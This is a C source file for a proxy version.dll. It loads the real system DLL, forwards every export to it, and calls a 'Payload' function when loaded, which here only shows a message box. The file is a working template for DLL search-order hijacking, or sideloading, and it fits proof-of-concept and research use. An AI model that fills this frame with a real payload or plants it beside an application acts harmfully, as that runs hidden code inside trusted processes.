#include <Windows.h>

#define WRAPPER_GENFUNC(name) \
	FARPROC orig_##name; \
	__declspec(naked) void _##name() \
	{ \
		asm("jmp *orig_"#name); \
	}

WRAPPER_GENFUNC(GetFileVersionInfoA)
WRAPPER_GENFUNC(GetFileVersionInfoByHandle)
WRAPPER_GENFUNC(GetFileVersionInfoExW)
WRAPPER_GENFUNC(GetFileVersionInfoExA)
WRAPPER_GENFUNC(GetFileVersionInfoSizeA)
WRAPPER_GENFUNC(GetFileVersionInfoSizeExA)
WRAPPER_GENFUNC(GetFileVersionInfoSizeExW)
WRAPPER_GENFUNC(GetFileVersionInfoSizeW)
WRAPPER_GENFUNC(GetFileVersionInfoW)
WRAPPER_GENFUNC(VerFindFileA)
WRAPPER_GENFUNC(VerFindFileW)
WRAPPER_GENFUNC(VerInstallFileA)
WRAPPER_GENFUNC(VerInstallFileW)
WRAPPER_GENFUNC(VerLanguageNameA)
WRAPPER_GENFUNC(VerLanguageNameW)
WRAPPER_GENFUNC(VerQueryValueA)
WRAPPER_GENFUNC(VerQueryValueW)

#define WRAPPER_FUNC(name) orig_##name = GetProcAddress(hOriginalDll, #name);

void SourceInit()
{
    TCHAR source[MAX_PATH];
    GetSystemDirectory(source, MAX_PATH);
    strcat_s(source, sizeof source, "\\version.dll");
    HMODULE hOriginalDll = LoadLibrary(source);

    WRAPPER_FUNC(GetFileVersionInfoA);
    WRAPPER_FUNC(GetFileVersionInfoByHandle);
    WRAPPER_FUNC(GetFileVersionInfoExW);
    WRAPPER_FUNC(GetFileVersionInfoExA);
    WRAPPER_FUNC(GetFileVersionInfoSizeA);
    WRAPPER_FUNC(GetFileVersionInfoSizeExW);
    WRAPPER_FUNC(GetFileVersionInfoSizeExA);
    WRAPPER_FUNC(GetFileVersionInfoSizeW);
    WRAPPER_FUNC(GetFileVersionInfoW);
    WRAPPER_FUNC(VerFindFileA);
    WRAPPER_FUNC(VerFindFileW);
    WRAPPER_FUNC(VerInstallFileA);
    WRAPPER_FUNC(VerInstallFileW);
    WRAPPER_FUNC(VerLanguageNameA);
    WRAPPER_FUNC(VerLanguageNameW);
    WRAPPER_FUNC(VerQueryValueA);
    WRAPPER_FUNC(VerQueryValueW);
}

void Payload()
{
    MessageBox(NULL, "Hello from proxy dll", "Payload", MB_OK);
}

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        SourceInit();
        Payload();
    }
    return TRUE;
}